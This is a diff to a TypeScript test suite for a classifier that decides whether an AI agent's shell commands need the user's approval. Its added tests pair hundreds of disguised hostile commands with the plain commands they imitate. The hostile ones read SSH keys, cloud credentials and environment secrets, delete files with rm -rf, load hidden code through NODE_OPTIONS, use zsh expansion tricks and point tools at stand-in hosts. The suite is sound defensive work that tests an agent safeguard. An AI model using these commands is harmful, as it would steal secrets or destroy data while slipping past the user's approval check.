@@ -1,5 +1,5 @@
-// Commands an agent could write so that Kit's dial reads them as harmless when they are not (item 88, docs/code-editor.md
-// "How an ask is read"). A read or a check goes without asking at every level, so each hostile line here must not be one
+// Commands an agent could write so that Kit's dial reads them as harmless when they are not (items 88 and 112,
+// docs/code-editor.md "How an ask is read"). A read or a check goes without asking at every level, so each hostile line here must not be one
 // with nothing outside: at the dial's lowest level, Asks every time, it is never taken alone. Each sits next to the plain
 // line it imitates, which still reads as it did, so ordinary reads do not start asking. Curl is the one deliberate change:
 // reaching the network is no longer a read.
@@ -296,8 +296,332 @@ describe("A4: a command that reaches the network", () => {
   });
 });
 
+describe("B1: a command with several actions, or a word read as the first of its kind", () => {
+  it("reads every command a find runs and every action it takes, not only the first", () => {
+    counted += holds([
+      ["find . -maxdepth 0 -exec true {} \\; -exec sh -c \"rm -rf x\" \\;", "find . -maxdepth 0 -exec true {} \\;", "read"],
+      ["find . -name x -exec cat {} \\; -execdir rm {} \\;", "find . -name x -exec cat {} \\;", "read"],
+      ["find . -exec echo {} + -ok rm {} \\;", "find . -exec echo {} +", "read"],
+      ["find . -type f -exec wc -l {} + -okdir rm {} \\;", "find . -type f -exec wc -l {} +", "read"],
+      ["find . -exec cat {} + -exec sh -c x {} +", "find . -name '*.ts' -exec grep -n foo {} +", "read"],
+      ["find . -exec cat {} \\; -fprint out.txt", "find . -exec cat {} \\; -print", "read"],
+      ["find . -exec cat {} \\; -fls out.txt", "find . -exec cat {} \\; -ls", "read"],
+      ["find . -exec cat {} \\; -fprintf out.txt %p", "find . -exec cat {} \\; -printf %p", "read"],
+      ["find . -exec cat {} \\; -fprint0 out.txt", "find . -exec cat {} \\; -print0", "read"],
+      ["find . -name x -files0-from list.txt", "find . -name x -print -quit", "read"],
+      ["find . -type f -newer /Users/fon/.ssh/id_rsa", "find . -type f -newer package.json", "read"],
+      ["find . -samefile /Users/fon/.ssh/id_rsa", "find -s . -name x", "read"],
+      ["find . -newermt 2026-01-01 -exec rm {} +", "find . -newermt 2026-01-01", "read"],
+      ["find . -mtime -7 -execdir sh -c x \\;", "find . -mtime -7 -type f", "read"],
+    ]);
+    // find reads a `+` as the end of a command only right after `{}`: elsewhere it is a word of the command
+    expect(read("find . -exec echo + -exec rm -rf src \\;").action).toBe("read");
+    // a delete that only takes what matches a name still reads as it did
+    expect(read("find . -name '*.log' -delete").action).toBe("delete");
+  });
+
+  it("reads a subcommand only where its program looks for it", () => {
+    counted += holds([
+      ["git stash -m list", "git stash list", "read"],
+      ["git stash -m show", "git stash show -p", "read"],
+      ["docker compose -p ps up -d", "docker compose ps", "read"],
+      ["docker compose --env-file logs up", "docker compose logs", "read"],
+      ["docker compose --project-directory ls up", "docker compose ls", "read"],
+      ["docker compose config -o out.yml", "docker compose config", "read"],
+    ]);
+  });
+});
+
+describe("B2: a runner's own options before the tool, and what loads a program into node", () => {
+  it("reads npx and a package manager's exec only with options known to change nothing about the tool", () => {
+    counted += holds([
+      ["npx --node-options='--import=data:text/javascript,1' vitest run", "npx vitest run", "check"],
+      ["npx --node-options=--require=./x.js vitest run", "npx -y vitest run", "check"],
+      ["npx --registry=https://x.example depcheck", "npx depcheck", "check"],
+      ["npx --userconfig=./x vitest run", "npx --yes vitest run", "check"],
+      ["npx --script-shell=./x vitest run", "npx --no vitest run", "check"],
+      ["npx -yq --registry=https://x.example depcheck", "npx -- vitest run", "check"],
+      ["pnpx depcheck", "pnpm exec vitest run", "check"],
+      ["pnpx vitest run", "pnpm vitest run", "check"],
+      ["bunx --bun vitest run", "bunx vitest run", "check"],
+      ["pnpm exec --env-file=./x vitest run", "pnpm exec -- vitest run", "check"],
+      ["pnpm exec --shell-mode vitest", "pnpm exec vitest", "check"],
+      ["pnpm exec --registry=https://x.example vitest run", "pnpm exec tsc --noEmit", "check"],
+      ["yarn exec --env-file=./x vitest run", "yarn exec vitest run", "check"],
+      ["bun x --bun vitest", "bun x vitest", "check"],
+      ["npm exec --node-options=--import=x vitest", "npm exec vitest", "check"],
+      ["npm x --registry=https://x.example depcheck", "npm x depcheck", "check"],
+    ]);
+  });
+
+  it("never lets node load a program the command does not show", () => {
+    counted += holds([
+      ["node --import=./x.js node_modules/.bin/vitest", "node --version", "read"],
+      ["node -r ./x.js", "node -v", "read"],
+      ["node --env-file=.env x.js", "node --version", "read"],
+      ["NODE_OPTIONS=--import=./x.js npx vitest run", "CI=1 npx vitest run", "check"],
+      ["NODE_OPTIONS=--import=./x.js git status", "NO_COLOR=1 git status", "read"],
+      ["npm_config_node_options=--import=./x pnpm test", "NODE_ENV=test pnpm test", "check"],
+      ["export NODE_OPTIONS=--require=./x.js; pnpm test", "export CI=1; pnpm test", "check"],
+      ["npx mocha -n import=./x.js", "npx mocha test", "check"],
+      ["npx mocha --node-option=import=./x.js", "npx mocha --recursive test", "check"],
+      ["npx ava --node-arguments='--import=./x.js'", "npx ava", "check"],
+      ["npx vitest run --poolOptions.forks.execArgv=--import=./x.js", "npx vitest run --pool=forks", "check"],
+      ["npx vitest run --pool=./x.js", "npx vitest run --pool=threads", "check"],
+      ["npx vitest run --diff=./x.js", "npx vitest run --reporter=dot", "check"],
+      ["npx vitest run --workspace=./x.ts", "npx vitest run --workspace=vitest.workspace.ts", "check"],
+      ["npx vitest run --coverage.customProviderModule=./x.js", "npx vitest run --coverage", "check"],
+      ["npx jest --runner=./x.js", "npx jest --runInBand", "check"],
+      ["pnpm test --pool=./x.js", "pnpm test -- --pool=forks", "check"],
+    ]);
+  });
+});
+
+describe("B3: what zsh expands that bash does not", () => {
+  it("never reads a word zsh splits, matches or evaluates from a variable", () => {
+    counted += holds([
+      ["LANG='-exec rm {} ;'; find . -maxdepth 0 $=LANG", "find . -maxdepth 0", "read"],
+      ["X=-delete; find . -name x $=X", "LANG=C; find . -name x", "read"],
+      ["export LANG='-o out.txt'; sort $=LANG src/a.txt", "export LANG=C; sort src/a.txt", "read"],
+      ["find . $~X", "find . -type f", "read"],
+      ["find . $^X", "find . -type d", "read"],
+      ["find . -maxdepth $+X", "find . -maxdepth 1", "read"],
+      ["find . ${=X}", "find . -empty", "read"],
+      ["find . ${(z)X}", "find . -print", "read"],
+      ["echo ${(e)X}", "echo done", "read"],
+      ["git log $=X", "git log --oneline", "read"],
+      ["rg foo $=X", "rg foo src", "read"],
+      ["cat =(cat /Users/fon/.ssh/id_rsa)", "cat a.txt", "read"],
+      ["cat <(cat src/a.ts) $~X", "cat src/a.ts", "read"],
+      ["ls $:X $/X", "ls src", "read"],
+    ]);
+    // a `$` with nothing after it is only itself
+    expect(read("echo $ done").action).toBe("read");
+    expect(read("grep -n 'a$' src/a.ts").action).toBe("read");
+  });
+
+  it("never reads a builtin that sets a variable a later word depends on as a read", () => {
+    counted += holds([
+      ["printf -v PATH %s ./bin; ls", "printf %s ./bin; ls", "read"],
+      ["printf -vPATH %s ./bin && git status", "printf -- '-v\\n' && git status", "read"],
+      ["export PATH=./bin; ls", "export LANG=C; ls", "read"],
+      ["PATH=./bin; ls", "LANG=C; ls", "read"],
+    ]);
+  });
+});
+
+describe("B4: a reading program's output file", () => {
+  it("sees the file a reading program writes, by its own options", () => {
+    counted += holds([
+      ["echo \"x\" | uniq -c - src/x.test.js", "echo x | uniq -c", "read"],
+      ["uniq -c in.txt out.txt", "uniq -c in.txt", "read"],
+      ["uniq -cd a.txt b.txt", "uniq -cd a.txt", "read"],
+      ["uniq -D a.txt b.txt", "uniq -D a.txt", "read"],
+      ["uniq --count a.txt b.txt", "uniq --count a.txt", "read"],
+      ["uniq -i -u a.txt b.txt", "uniq -i -u a.txt", "read"],
+      ["uniq -f 1 -c a.txt b.txt", "uniq -f 1 a.txt", "read"],
+      ["uniq --skip-chars=2 a.txt b.txt", "uniq -s 2 a.txt", "read"],
+      ["xxd -i a.bin out.h", "xxd -i a.bin", "read"],
+      ["xxd -u a.bin out.hex", "xxd -u a.bin", "read"],
+      ["xxd -cols 8 a.bin out.hex", "xxd -c 8 a.bin", "read"],
+      ["yq -s '\"out_\" + $index' a.yaml", "yq '.a' a.yaml", "read"],
+      ["yq --split-exp .name a.yaml", "yq -o json a.yaml", "read"],
+      ["terraform plan -out=tf.plan", "terraform plan", "read"],
+      ["terraform plan -out tf.plan", "terraform plan -refresh-only", "read"],
+      ["terraform plan -generate-config-out=gen.tf", "terraform plan -var-file=dev.tfvars", "read"],
+      ["helm template web ./chart --output-dir out", "helm template web ./chart", "read"],
+      ["helm template web ./chart --post-renderer ./x", "helm lint ./chart", "read"],
+      ["pulumi preview --save-plan=plan.json", "pulumi preview", "read"],
+      ["kubectl get pods --cache-dir=kc", "kubectl get pods", "read"],
+      ["kubectl get pods --profile=cpu", "kubectl get pods -n web", "read"],
+      ["kubectl get pods --profile-output=x.pprof", "kubectl get pods --profile=none", "read"],
+      ["lsof -Db", "lsof -i :3000", "read"],
+      ["docker compose config --output=out.yml", "docker compose config --services", "read"],
+    ]);
+    // a synth runs the project's app and writes what it makes: no read
+    for (const line of ["cdk synth", "cdk diff"]) expect([line, read(line).action]).toEqual([line, "change"]);
+  });
+});
+
+describe("B5: a file read from outside the project that the words did not show as one", () => {
+  it("checks a file an option reads, and asks for a list of files read from a file", () => {
+    counted += holds([
+      ["jq -R -f /dev/stdin /Users/fon/.ssh/id_rsa", "jq -R . notes.txt", "read"],
+      ["jq -Rf /dev/stdin /Users/fon/.ssh/id_rsa", "jq -r .name package.json", "read"],
+      ["jq --from-file=/dev/stdin ~/.ssh/id_rsa", "jq --from-file=filter.jq data.json", "read"],
+      ["jq -L /Users/fon/.secrets -n 'import \"k\" as $k; $k'", "jq -n '1 + 1'", "read"],
+      ["jq -n 'import \"k\" as $k; $k'", "jq -n '[1, 2] | length'", "read"],
+      ["jq -n 'include \"k\"; .'", "jq '.a' data.json", "read"],
+      // jq's `env` and `$ENV` print every variable set, keys among them, as printenv does; a field called env is only a name
+      ["jq -n env", "jq .env package.json", "read"],
+      ["jq -n 'env'", "jq '.env.NODE_ENV' config.json", "read"],
+      ["jq -n '$ENV.AWS_SECRET_ACCESS_KEY'", "jq '{env: .mode}' config.json", "read"],
+      ["jq -r 'env | keys[]' package.json", "jq -r '.scripts | keys[]' package.json", "read"],
+      ["jq -n '[env[]]|length'", "jq '.environment' config.json", "read"],
+      ["jq -n --arg x 1 '$ENV|.HOME'", "jq -n --arg env prod '$env'", "read"],
+      ["yq -n 'env(HOME)'", "yq '.env' config.yaml", "read"],
+      // `--arg` and its kind take a name and a value: the word after them is not the filter
+      ["jq -n --arg x 1 'import \"k\" as $k; $k'", "jq -n --arg x 1 '$x'", "read"],
+      ["jq --argjson a 1 --arg b 2 -n 'env'", "jq --argjson a 1 --arg b 2 '.[$b]' data.json", "read"],
+      ["jq --slurpfile k /Users/fon/.aws/credentials -n '$k'", "jq --slurpfile k more.json '$k' data.json", "read"],
+      ["jq --arg f x . /Users/fon/.ssh/id_rsa", "jq --arg f x '.[$f]' data.json", "read"],
+      ["yq '.a = strenv(AWS_SECRET_ACCESS_KEY)' a.yaml", "yq '.a' a.yaml", "read"],
+      ["git grep -f /Users/fon/.ssh/id_rsa src", "git grep -f patterns.txt src", "read"],
+      ["git grep -nf /Users/fon/.ssh/id_rsa", "git grep -e foo src", "read"],
+      ["wc --files0-from=list.txt", "wc -l src/a.ts", "read"],
+      ["du --files0-from list.txt", "du -sh src", "read"],
+      ["sort --files0-from=list.txt", "sort src/a.txt", "read"],
+      ["strings @/Users/fon/.ssh/id_rsa", "strings a.bin", "read"],
+      ["cat @~/.ssh/id_rsa", "cat a.txt", "read"],
+    ]);
+    // `@~1` is git's name for a commit, not a file
+    expect(read("git diff @~1")).toMatchObject({ action: "read", outside: [] });
+  });
+
+  it("checks the file a commit takes its message from, so a kept git commit rule cannot carry one out", () => {
+    for (const [line, path] of [
+      ["git commit -F ~/.ssh/id_rsa", "~/.ssh/id_rsa"],
+      ["git commit --file /Users/fon/.ssh/id_rsa", "/Users/fon/.ssh/id_rsa"],
+      ["git commit --file=/Users/fon/.ssh/id_rsa", "/Users/fon/.ssh/id_rsa"],
+      ["git commit -t ../other/secret.txt", "../other/secret.txt"],
+      ["git commit -a -F /etc/passwd", "/etc/passwd"],
+    ])
+      expect([line, read(line).outside, read(line).rule]).toEqual([line, [path], null]);
+    for (const line of ["git commit -F msg.txt", "git commit -m 'Add ~/.zshrc to the docs'", "git commit --fixup HEAD~1"]) expect([line, read(line).outside]).toEqual([line, []]);
+  });
+
+  it("asks for a change that reads its list of files from a file", () => {
+    for (const line of ["tar -czf a.tgz -T list.txt", "tar --files-from=list.txt -cf a.tar", "rsync -a --files-from=list.txt . backup/", "zip -@ a.zip < list.txt", "zip -r@ a.zip < list.txt"])
+      expect([line, read(line).action]).toEqual([line, "unknown"]);
+    for (const line of ["tar -czf a.tgz src", "rsync -a src/ backup/", "zip -r a.zip src"]) expect([line, read(line).action]).toEqual([line, "change"]);
+  });
+});
+
+describe("B6: a read or a check pointed at another computer", () => {
+  it("is a send, for every program, when a word is an address or an option names a server", () => {
+    counted += holds([
+      ["kubectl get pods --server=http://x.example/k", "kubectl get pods", "read"],
+      ["kubectl get pods -s x.example:443", "kubectl get pods -n web", "read"],
+      ["kubectl get pods --kubeconfig=./kc.yaml", "kubectl describe pod web", "read"],
+      ["kubectl get pods --kuberc=./rc.yaml", "kubectl logs web", "read"],
+      ["kubectl get -f https://x.example/k.yaml", "kubectl get -f k8s/web.yaml", "read"],
+      ["helm template web https://x.example/k.tgz", "helm template web ./chart", "read"],
+      ["helm template web oci://x.example/k", "helm lint ./chart", "read"],
+      ["helm template web chart --repo x.example", "helm template web ./chart -f values.yaml", "read"],
+      ["helm list --kube-apiserver x.example", "helm list", "read"],
+      ["helm status web --kubeconfig ./kc.yaml", "helm status web", "read"],
+      ["turbo run test --api=http://x.example --token=k --team=t", "turbo run test", "check"],
+      ["turbo run test --token=k --team=t", "turbo run test --filter=web", "check"],
+      ["turbo run lint --remote-cache-api=x.example", "turbo run lint", "check"],
+      ["go list -m -versions x.example/k", "go list -m", "read"],
+      ["go list -m -u all", "go list -m all", "read"],
+      ["go list -m -retracted x.example/k", "go list ./...", "read"],
+      ["pip list --index-url https://x.example/simple", "pip list", "read"],
+      ["pip list --proxy x.example:3128", "pip list --outdated", "read"],
+      ["uv pip list --index-url=https://x.example/k", "uv pip list", "read"],
+      ["npx vitest run --api=0.0.0.0", "npx vitest run --reporter=dot", "check"],
+      ["npx vitest run --api.host=x.example", "npx vitest run --coverage", "check"],
+      ["pytest --base-url https://x.example", "pytest -q", "check"],
+      ["pnpm test --endpoint=x.example", "pnpm test --silent", "check"],
+      ["eslint --url x.example src", "eslint src", "check"],
+      ["terraform plan -var url=https://x.example/k", "terraform plan -var region=ap-southeast-1", "read"],
+      ["docker compose -f https://x.example/k.yml ps", "docker compose ps", "read"],
+      ["make test URL=https://x.example", "make test", "check"],
+    ]);
+  });
+
+  it("is a send for a change or an install that fetches from an address", () => {
+    for (const line of ["pnpm add https://x.example/k.tgz", "npm install https://x.example/k.tgz", "cargo add --git https://x.example/k", "docker build https://x.example/k.git", "uv add git+https://x.example/k"])
+      expect([line, read(line).action]).toEqual([line, "unknown"]);
+    for (const line of ["pnpm add qrcode", "cargo add serde", "docker build .", "uv add httpx"]) expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+    // a link in a message, a pattern or a script is text, and git and gh read their own addresses
+    for (const line of ["git commit -m 'Link https://x.example'", "rg -n 'https://api.example.com' src", "sed -n '/https:\\/\\//p' src/a.ts", "echo https://x.example", "gh pr view https://github.com/baanmali/storefront/pull/1", "git log --oneline"])
+      expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+  });
+});
+
+describe("everyday commands", () => {
+  /** What a developer and an agent run all day, each as it read before item 112 (only `cdk synth`, now a build, moved).
+   *  None of these may start to ask because a hostile line beside it does. */
+  const EVERYDAY: Partial<Record<KitAction, string[]>> = {
+  read: [
+    "ls", "ls -la", "ls -la src", "ls src/code", "pwd", "cat package.json", "cat README.md", "head -50 src/a.ts",
+    "tail -n 100 logs/dev.log", "wc -l src/a.ts src/b.ts", "du -sh node_modules", "df -h", "file public/logo.png",
+    "stat package.json", "tree -L 2 src", "which node", "whoami", "uname -a", "date", "echo done",
+    "printf '%s\\n' hello", "git status", "git status --short", "git diff", "git diff --stat", "git diff --cached",
+    "git diff HEAD~1", "git diff @~1", "git diff main...HEAD", "git log --oneline -10",
+    "git log --oneline --graph --all", "git log -p -1", "git log --author=fon --since=2.weeks", "git show HEAD",
+    "git show --stat HEAD", "git blame src/a.ts", "git branch", "git branch -a", "git branch -vv",
+    "git branch --show-current", "git tag -l", "git remote -v", "git rev-parse HEAD",
+    "git rev-parse --abbrev-ref HEAD", "git ls-files", "git stash list", "git stash show -p", "git fetch",
+    "git fetch origin", "git fetch --prune", "git grep -n checkout", "git grep -e foo -- src",
+    "git config --get user.name", "git merge-base main HEAD", "git describe --tags", "git shortlog -sn", "gh pr list",
+    "gh pr view 12", "gh pr view https://github.com/baanmali/storefront/pull/1", "gh pr status", "gh pr checks",
+    "gh pr diff 12", "gh issue list", "gh run list", "gh run view 123 --log", "rg checkout src", "rg -n \"TODO\" src",
+    "rg -l foo", "rg --files", "rg -t ts useState", "rg -n 'https://api.example.com' src", "grep -rn foo src",
+    "grep -c foo src/a.ts", "find . -name '*.ts'", "find src -type f -name '*.test.ts'",
+    "find . -name node_modules -prune -o -name '*.ts' -print", "find . -type f -newer package.json",
+    "find . -maxdepth 2 -type d", "find src -name '*.ts' -exec grep -l useState {} +", "fd -e ts",
+    "sed -n '1,40p' src/a.ts", "sed 's/foo/bar/g' src/a.ts", "awk '{print $1}' data.txt", "sort src/a.txt",
+    "sort -u names.txt", "uniq names.txt", "uniq -c names.txt", "cut -d, -f1 data.csv", "tr a-z A-Z", "xxd a.bin",
+    "jq . package.json", "jq -r .version package.json", "jq '.scripts' package.json", "jq -n '1 + 1'",
+    "diff a.txt b.txt", "cmp a.bin b.bin", "pnpm outdated", "pnpm why react", "pnpm ls", "npm ls",
+    "npm view qrcode version", "pip list", "pip show requests", "go list ./...", "go list -m all", "go env GOPATH",
+    "docker ps", "docker compose ps", "docker compose logs", "docker images", "kubectl get pods",
+    "kubectl get pods -n web", "kubectl describe pod web", "kubectl logs web", "helm template web ./chart",
+    "helm lint ./chart", "terraform plan", "terraform validate", "cd src && ls", "export CI=1", "curl --version",
+    "wrangler whoami", "vercel ls",
+  ],
+  check: [
+    "pnpm test", "pnpm run test", "pnpm test -- src/a.test.ts", "pnpm lint", "pnpm typecheck", "pnpm -r test",
+    "pnpm --filter @manut/desktop test", "pnpm exec vitest run", "pnpm exec tsc --noEmit",
+    "pnpm exec playwright test e2e/home.spec.ts", "pnpm vitest run", "npm test", "npx vitest run",
+    "npx vitest run src/a.test.ts", "npx vitest --run --reporter=verbose", "npx tsc --noEmit", "npx eslint src",
+    "npx prettier --check .", "npx playwright test", "npx playwright test --project=chromium", "npx jest",
+    "npx jest --coverage", "npx -y vitest run", "yarn test", "bun test", "bunx vitest run", "vitest run",
+    "tsc --noEmit", "eslint src", "prettier --check .", "python -m pytest", "python -m pytest -q tests", "pytest -x",
+    "go test ./...", "go vet ./...", "cargo test", "cargo check", "cargo clippy", "cargo fmt --check", "make test",
+    "make -j4 test", "cd apps/desktop && pnpm test", "CI=1 pnpm test", "NODE_ENV=test pnpm test", "turbo run test",
+    "turbo run test --filter=web",
+  ],
+  change: [
+    "git add -A", "git add src/a.ts", "git commit -m \"Add QR\"", "git commit -am \"Fix\"",
+    "git commit --amend --no-edit", "git switch -c kit/qr", "git checkout main", "git stash", "git stash pop",
+    "git stash push -m wip", "git pull", "git pull --rebase", "git rebase main", "git merge main",
+    "sed -i '' 's/foo/bar/g' src/a.ts", "pnpm build", "pnpm dev", "npm run build", "npx eslint --fix src",
+    "npx prettier --write src", "go build ./...", "cargo build", "make build", "docker compose up -d",
+    "docker build .", "terraform fmt", "mkdir -p src/qr", "touch src/qr.ts", "cp src/a.ts src/b.ts",
+    "mv src/a.ts src/b.ts", "echo hi > notes.md", "turbo run build",
+  ],
+  install: [
+    "pnpm install", "pnpm i", "pnpm add qrcode", "pnpm add -D vitest", "pnpm remove dayjs", "npm ci", "npm install",
+    "yarn", "yarn add qrcode", "bun install", "go mod tidy",
+  ],
+  delete: [
+    "find . -name '*.log' -delete", "rm src/old.ts", "rm -rf dist",
+  ],
+  push: [
+    "git push", "git push -u origin kit/promptpay-qr", "gh pr create --title \"QR\" --body \"Adds a QR\"",
+  ],
+  };
+
+  it("read as they did before item 112", () => {
+    const wrong: string[] = [];
+    let n = 0;
+    for (const [as, lines] of Object.entries(EVERYDAY)) {
+      for (const line of lines ?? []) {
+        n++;
+        const c = read(line);
+        if (c.action !== as || c.outside.length) wrong.push(`${line}: ${c.action} [${c.outside.join(", ")}]`);
+      }
+    }
+    expect(wrong).toEqual([]);
+    expect(n).toBeGreaterThanOrEqual(200);
+  });
+});
+
 describe("the table", () => {
-  it("holds at least 120 hostile lines, each beside the plain line it imitates", () => {
-    expect(counted).toBeGreaterThanOrEqual(120);
+  it("holds at least 300 hostile lines, each beside the plain line it imitates", () => {
+    expect(counted).toBeGreaterThanOrEqual(300);
   });
 });
